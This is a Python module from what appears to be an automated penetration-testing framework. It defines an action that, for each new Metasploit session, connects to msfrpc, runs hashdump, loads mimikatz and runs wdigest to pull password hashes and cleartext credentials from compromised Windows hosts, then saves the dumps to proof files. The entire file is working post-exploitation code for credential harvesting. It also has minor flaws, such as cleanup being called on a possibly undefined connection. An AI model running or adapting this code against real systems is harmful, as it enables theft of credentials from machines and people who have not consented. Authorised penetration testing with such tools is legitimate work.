from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.mymsf import myMsf
from core.utils import Utils


class post_msf_dumphashes(actionModule):
    def __init__(self, config, display, lock):
        super(post_msf_dumphashes, self).__init__(config, display, lock)
        self.title = "Gather hashes from MSF Sessions"
        self.shortName = "MSFDumpHashes"
        self.description = "execute [hashdump] and [mimikatz - wdigest] on any new msf sessions"

        self.requirements = ["msfconsole"]
        self.triggers = ["msfSession"]
        self.types = ["passwords"]

        self.safeLevel = 4

    def getTargets(self):
        # we are interested only in the hosts that had nullsessions
        self.targets = kb.get('shell/*/msf')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        for t in self.targets:
            sessions = kb.get('shell/' + t + '/msf')

            if len(sessions) > 0:
                # connect to msfrpc
                msf = myMsf(host=self.config['msfhost'], port=self.config['msfport'], user=self.config['msfuser'],
                            password=self.config['msfpass'])

                if msf.isAuthenticated():
                    # loop over each target
                    for s in sessions:
                        # verify we have not tested this session before
                        if not self.seentarget(s):
                            # add the new IP to the already seen list
                            self.addseentarget(s)
                            msf.execute("sessions -i " + str(s) + "\n")
                            msf.sleep(int(self.config['msfexploitdelay']))
                            msf.execute("hashdump\n")
                            msf.sleep(int(self.config['msfexploitdelay']))
                            msf.execute("background\n")

                            # TODO - process results and store results in KB
                            # regex match on [^:]+:[^:]+:[^:]+:[^:]+:::
                            outfile = self.config[
                                          "proofsDir"] + self.shortName + "_HashDump_" + t + "_" + Utils.getRandStr(
                                10)
                            text = msf.getResult()
                            Utils.writeFile(text, outfile)
                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))

                            msf.execute("sessions -i " + str(s) + "\n")
                            msf.sleep(int(self.config['msfexploitdelay']))
                            msf.execute("load mimikatz\n")
                            msf.sleep(int(self.config['msfexploitdelay']))
                            msf.execute("wdigest\n")
                            msf.sleep(int(self.config['msfexploitdelay']))
                            msf.execute("background\n")

                            # TODO - process results and store results in KB
                            outfile = self.config[
                                          "proofsDir"] + self.shortName + "_Mimikatz_" + t + "_" + Utils.getRandStr(
                                10)
                            text = msf.getResult()
                            Utils.writeFile(text, outfile)
                            kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))

            # clean up after ourselves
            result = msf.cleanup()

        return
